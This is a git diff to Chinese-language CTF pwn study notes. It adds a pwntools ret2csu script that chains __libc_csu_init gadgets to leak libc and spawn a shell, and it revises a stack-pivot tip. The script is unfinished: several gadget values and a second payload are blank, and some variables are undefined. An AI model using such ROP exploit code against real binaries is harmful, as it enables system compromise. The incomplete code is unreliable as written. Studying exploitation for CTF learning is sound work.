@@ -131,6 +131,52 @@ if __name__ == "__main__":
     sh.interactive()
 ```
 
+
+还有一个比较方便的csu的脚本
+```python
+from pwn import *
+p = process('./pwn')
+
+context(os='linux', arch='amd64', log_level='debug')
+elf = ELF('./pwn')
+lib = elf.libc    # 这个可以直接进行lib的获取
+
+main_addr = elf.symbols['main']
+read_plt = elf.plt['read']
+pop_rdi = 
+pop_rsi = 
+pop_rdx = 
+leave_ret = 
+
+def csu(rdi, rsi, rdx, call, rbp):
+		'''
+		前3个是函数调用的三个参数
+		call：这是用来调用的函数地址
+		rbp使用来进行后面的调控
+		'''
+    pay = p64(0x4006CA)   # 返回地址
+    pay += p64(0) + p64(1) + p64(call) + p64(rdi) + p64(rsi) + p64(rdx)
+    pay += p64(0x4006B0)  # 返回地址
+    pay += p64(0) * 2 + p64(rbp) + p64(0) * 4  # rbp重新赋值
+    return pay
+
+payload = b'' + csu(0, read_got, 0xd8, read_got, 0x606a00) + p64(gadget)
+
+p.send(payload) 
+
+p.send(b'\xd0')
+lib.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+info(f'{lib.address = :x}')
+
+system = lib.sym['system']
+binsh = next(lib.search(b'/bin/sh'))
+payload2 = 
+
+p.send(payload)
+p.interactive()
+
+```
+
 ## ret2shellcode
 
 ```python
@@ -227,7 +273,7 @@ p.interactive()
 
 ### 小技巧
 
-- 栈迁移的前置条件可以不是必须要`leave`指令，在将`ebp`进行覆盖以后就算是进行栈迁移了，因为后面返回的函数结束之后就会进入到我们想要的地方
+- 栈迁移的前置条件可以不是必须在栈中构建`leave`指令，在将`ebp`进行覆盖以后就算是进行栈迁移了，因为后面返回的函数结束之后自带`leave`指令，尤其是例如`main`函数之类的默认函数。在我们确定了有两个函数返回存在自带`leave`指令的时候即可使用
 
 ## canary相关
 
